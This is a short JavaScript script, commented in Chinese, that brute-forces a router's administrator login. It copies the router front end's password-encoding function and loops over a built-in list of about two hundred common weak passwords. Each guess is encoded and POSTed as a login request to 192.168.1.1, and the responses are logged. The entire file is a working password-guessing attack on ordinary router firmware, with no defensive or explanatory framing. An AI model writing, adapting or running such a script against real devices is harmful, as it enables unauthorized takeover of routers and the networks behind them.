/** 来自路由器前端的加密脚本 */
function securityEncode(a, b, d) {
  var c = "",
    e,
    g,
    h,
    m,
    p = 187,
    r = 187;
  g = a.length;
  h = b.length;
  m = d.length;
  e = g > h ? g : h;
  for (var k = 0; k < e; k++)
    (r = p = 187),
      k >= g
        ? (r = b.charCodeAt(k))
        : k >= h
        ? (p = a.charCodeAt(k))
        : ((p = a.charCodeAt(k)), (r = b.charCodeAt(k))),
      (c += d.charAt((p ^ r) % m));
  return c;
}

/** 发送post请求，尝试管理员密码 */
function tryPwd(password) {
  var url = "http://192.168.1.1/";
  var params = { method: "do", login: { password: password } };
  var xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);
  xhr.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
  xhr.onload = function () {
    if (xhr.readyState === 4) {
      if (xhr.status === 200) {
        console.log(xhr.responseText);
      } else {
        console.error(xhr.statusText);
      }
    }
  };
  xhr.onerror = function (error) {
    console.error(xhr.statusText, error);
  };
  xhr.send(JSON.stringify(params));
}

var str1 = "RDpbLfCPsJZ7fiv";
var str2 =
  "yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW";
/** 一个简单的弱密码本 */
var pwds =
  "123456789,password,iloveyou,princess,1234567,rockyou,12345678,abc123,nicole,daniel,babygirl,monkey,lovely,jessica,654321,michael,ashley,qwerty,111111,iloveu,000000,michelle,tigger,sunshine,chocolate,password1,soccer,anthony,friends,butterfly,purple,jordan,liverpool,justin,loveme,fuckyou,123123,football,secret,andrea,carlos,jennifer,joshua,bubbles,1234567890,superman,hannah,amanda,loveyou,pretty,basketball,andrew,angels,tweety,flower,playboy,elizabeth,hottie,tinkerbell,charlie,samantha,barbie,chelsea,lovers,jasmine,brandon,666666,shadow,melissa,eminem,matthew,robert,danielle,forever,family,jonathan,987654321,computer,whatever,dragon,vanessa,cookie,naruto,summer,sweety,spongebob,joseph,junior,softball,taylor,yellow,daniela,lauren,mickey,princesa,alexandra,alexis,estrella,miguel,william,thomas,beautiful,mylove,angela,poohbear,patrick,iloveme,sakura,adrian,alexander,destiny,christian,121212,sayang,america,dancer,monica,richard,112233,princess1,555555,diamond,carolina,steven,rangers,louise,orange,789456,999999,shorty,nathan,snoopy,gabriel,hunter,cherry,killer,sandra,alejandro,buster,george,brittany,alejandra,patricia,rachel,tequiero,7777777,cheese,159753,arsenal,dolphin,antonio,heather,ginger,stephanie,peanut,blink182,sweetie,222222,beauty,987654,victoria,fernando,pokemon,maggie,corazon,chicken,pepper,cristina,rainbow,kisses,manuel,myspace,rebelde,angel1,ricardo,babygurl,heaven,baseball,martin,greenday,november,alyssa,madison,mother,123321,123abc,mahalkita,batman,september,december,morgan,mariposa,gabriela,iloveyou2,bailey,jeremy,pamela,kimberly,gemini,shannon,pictures,asshole,sophie,jessie,hellokitty,claudia,babygirl1,angelica,austin,mahalko,victor,horses,tiffany,mariana";

var pwdArr = pwds.split(",");
for (const pwd of pwdArr) {
  console.log(`尝试：${pwd}...`);
  tryPwd(securityEncode(str1, pwd, str2));
}
